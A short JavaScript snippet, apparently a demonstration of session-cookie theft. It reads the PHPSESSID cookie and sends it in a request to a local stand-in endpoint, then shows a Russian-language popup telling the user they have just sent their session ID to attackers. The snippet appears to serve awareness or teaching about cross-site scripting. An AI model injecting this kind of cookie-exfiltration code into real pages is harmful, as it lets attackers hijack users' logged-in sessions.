$.ajax({
    url: `http://localhost/france?cookie=${window.getCookie("PHPSESSID")}`,
    success: function() {
        $.notify({
            title: 'О-ой!',
            text: 'Вы только что отправили свой PHPSESSID злоумыленникам. :/'
        }, {
            className: 'error'
        });
    }
});